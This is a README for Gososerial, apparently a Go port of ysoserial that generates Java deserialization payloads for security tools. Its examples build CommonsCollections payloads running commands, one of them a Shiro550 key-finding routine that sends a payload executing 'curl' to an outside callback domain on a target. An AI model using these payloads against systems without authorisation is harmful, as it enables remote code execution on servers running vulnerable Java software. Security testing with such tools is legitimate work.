# Gososerial

## Introduce

- Ysoserial is a well-known tool for Java deserialization security

- No Java environment and no need to download ysoserial.jar file

- Enter the command to directly obtain the payload, which is convenient for writing security tools

## Quick Start

```shell
go get github.com/JimmyWA/Gososerial
```

```go
package main

import gososerial "github.com/JimmyWA/Gososerial"

func main()  {
	payload := gososerial.GetCC1("calc.exe")
	......
	sendPayload(payload)
	......
}
```

Shiro550 Scan Code

```go
......
func TestFindShiro(t *testing.T) {
	target := "http://a.b.c.d:8080/"
	key := shiro.CheckShiroKey(target)
	if key != "" {
		log.Info("find key: %s", key)
	}
	payload := gososerial.GetCC5("curl xxxxx.ceye.io")
	shiro.SendPayload(key, payload, target)
}
......
```

## Reference

**4ra1n**: https://github.com/4ra1n

**ysoserial**: https://github.com/frohoff/ysoserial

**xray**: https://github.com/chaitin/xray

**phith0n**: https://github.com/phith0n
